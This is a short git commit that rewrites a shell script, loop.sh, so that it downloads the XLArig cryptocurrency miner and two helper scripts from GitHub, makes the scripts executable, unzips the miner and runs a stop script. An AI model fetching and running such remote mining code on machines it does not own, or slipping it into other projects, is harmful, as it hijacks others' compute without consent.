4ce98ddc83b6f871ccc58ced511d4d64cf273c23
nids4easy <50073725+nids4easy@users.noreply.github.com>
2021-05-02 21:39:49 +0700

    Update loop.sh

--- loop.sh
+++ loop.sh
@@ -1,4 +1,4 @@
-while true; do 
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip https://github.com/nids4easy/xla/raw/main/scala_start.sh https://github.com/nids4easy/xla/raw/main/stop.sh
+chmod u+x scala_start.sh stop.sh
+unzip XLArig-v5.2.2-linux-x86_64.zip
 ./stop.sh
-sleep 120
-done
